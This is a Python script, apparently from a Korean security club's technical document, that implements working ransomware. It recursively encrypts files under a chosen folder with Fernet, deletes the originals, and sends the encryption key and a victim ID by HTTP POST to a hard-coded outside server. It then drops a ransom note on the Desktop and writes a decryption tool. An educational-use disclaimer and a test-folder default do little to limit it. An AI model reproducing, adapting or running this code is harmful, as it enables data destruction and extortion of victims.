import secrets
import base64
import os
import requests
from cryptography.fernet import Fernet
    
def main():
    warning()
    
    encryption_key=generate_encryption_key()
    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=".txt")
    
    your_id=make_id()
    send_key(f"{your_id} : {encryption_key.decode()}")
    create_and_display_ransom_note(your_id)

    if 1==0:
        print(f"생성된 key : {encryption_key.decode()}")
    exit(0)

def generate_encryption_key(length=32):
    """
    @breif : 암호화키를 생성하는 코드
    @param : 암호화키의 길이
    @return : param만큼의 문자열
    """
    secret_token=secrets.token_hex(length)
    byte_secret_token=bytes.fromhex(secret_token)
    encoded_key=base64.urlsafe_b64encode(byte_secret_token)
    return encoded_key

def search_and_encrypt_files(key,path="C:\\test",extension=".txt"):
    """
    @breif : 시스템 내 파일 탐색 및 암호화 실행
    @param key : SHA256 방식으로 암호화할 키
    @param path : 암호화를 진행할 최상위폴더
    @param extension : 암호화를 진행할 확장자("all" : 전부)
    @return : None
    """

    def search_file(directory:str, *extension:tuple[str]):
        """
        @breif : 주어진 디렉토리 내에서 특정 확장자를 가진 모든 파일을 탐색합니다.
        @param directory : 탐색할 디렉토리의 경로
        @param extension : 찾고자 하는 파일의 확장자
        @return : 해당 확장자를 가진 모든 파일의 경로 목록
        """
        files_found = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if "all" in extension:
                    files_found.append(os.path.join(root, file))
                else:
                    if file.endswith(tuple(extension)):
                        files_found.append(os.path.join(root, file))
        return files_found
    
    def encrypt_file(filename):
        """
        @breif : AES256 방식으로 암호화하는 함수
        @param : 파일명
        @return : None
        """
        with open(filename,"rb") as target:
            cipher=Fernet(key)
            with open(filename+".hacked","wb") as locked_file:
                locked_file.write(cipher.encrypt(target.read()))
        os.remove(filename)
        return

    files=search_file(path,extension)
    for file in files:
        encrypt_file(file)
    return

def create_and_display_ransom_note(id):
    """
    @breif : 사용자에게 요구사항을 알리는 랜섬노트 생성 및 표시
    @param : 사용자를 식별할 id
    @return : None
    """
    def __find_desktop_path__():
        # 바탕화면 경로를 찾는 함수
        home_dir = os.path.expanduser("~")
        desktop_dir = os.path.join(home_dir, 'Desktop')
        return desktop_dir
    
    __desktop_path__=__find_desktop_path__()
    ransom_note=__desktop_path__+"\\Readme.txt"
    decode_tool="DecodeTool.py"
    
    with open(ransom_note,"w+",encoding="utf-8") as f:
        message=f"""
당신의 컴퓨터는 해킹되었습니다.
keeper14기 강백준,이영재에게 돈을 입금하세요.
2024-01-08 keeper 기술문서
당신의 아이디 : {id}"""
        f.write(message)
        f.seek(0,0) # fseek(fp,0,SEEK_SET);
        print(f.read())
        
    with open(decode_tool,"w") as f:
        code="""
from cryptography.fernet import Fernet
import os

def search_file(directory:str, extension:list):
    files_found = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(extension)):
                files_found.append(os.path.join(root, file))
    return files_found

key = input("Input key\\n\\n").encode()
encrypted_files = search_file('C:\\\\test', ['.hacked'])

cipher = Fernet(key)
for encrypted_file in encrypted_files:
    decrypted_file = (encrypted_file.rsplit('.hacked',1))[0]

    with open(encrypted_file, "rb") as encrypted_target:
        decrypted_data = cipher.decrypt(encrypted_target.read())
        with open(decrypted_file, "wb") as decrypted_file_target:
            decrypted_file_target.write(decrypted_data)
    
    os.remove(encrypted_file)
    print(f"Decoded: {decrypted_file}")

print("Decode process completed.")
        """
        f.write(code)

    input("Good Luck.")
    return

def make_id():
    """
    @brief : 복호화 협상을 시도할 아이디 생성
    @param : None
    @return : None
    """
    return secrets.token_hex(4)
    
def send_key(text):
    """
    @brief : 해커서버에 암호화키를 전송하는 함수
    @param : 전송할 메시지
    @return : None
    """
    url = 'http://180.64.207.217:9999//write.php'
    data = {'message': text}
    response = requests.post(url, data=data)
    print(response.text)
    return

def warning():
    print("================================== 주의사항 ==================================")
    print("본 프로그램은 교육 및 연구 목적으로만 제공됩니다.")
    print("이 프로그램이나 이로 인해 파생된 어떠한 소프트웨어도 실제 환경에서의 사용을 목적으로 하지 않습니다.")
    print("악의적 목적이나 불법 행위에 사용될 수 없습니다.")
    print()
    print("사용자는 본 프로그램을 사용함에 있어 발생하는 모든 위험을 부담하며,")
    print("프로그램 사용으로 인한 모든 결과에 대한 책임은 전적으로 사용자에게 있습니다.")
    print("=============================================================================")
    print()
    print("계속 진행하시려면 아래 문장을 정확히 입력해주세요.")
    consent=input("주의사항을 숙지하였습니다\n")
    if consent.replace(" ","")!='주의사항을숙지하였습니다':
        exit(-1)

if __name__ == "__main__":
    main()
